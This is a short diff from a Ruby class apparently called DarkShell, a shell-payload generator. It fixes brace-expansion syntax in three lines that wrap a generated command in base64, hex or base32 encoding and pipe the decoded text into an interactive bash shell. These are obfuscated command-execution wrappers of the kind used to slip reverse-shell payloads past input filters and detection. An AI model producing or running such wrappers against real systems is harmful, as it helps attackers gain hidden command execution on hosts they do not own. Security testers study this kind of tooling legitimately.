@@ -188,9 +188,9 @@ class DarkShell
 
     generate_raw.each do |cmd|
       commands << cmd
-      commands << "sh -c '{echo,#{Base64.encode64(cmd).delete("\n")}|{base64,-d}|{bash,-i}'"
-      commands << "sh -c '{echo,#{hex_encode(cmd)}|{xxd,-p,-r}|{bash,-i}'"
-      commands << "sh -c '{echo,#{base32_encode(cmd).delete("\n")}|{base32,-d}|{bash,-i}'"
+      commands << "sh -c '{echo,#{Base64.encode64(cmd).delete("\n")}}|{base64,-d}|{bash,-i}'"
+      commands << "sh -c '{echo,#{hex_encode(cmd)}}|{xxd,-p,-r}|{bash,-i}'"
+      commands << "sh -c '{echo,#{base32_encode(cmd).delete("\n")}}|{base32,-d}|{bash,-i}'"
       #commands << "echo #{Base64.encode64(cmd).delete("\n")}|base64 -d|bash -i"
     end
 
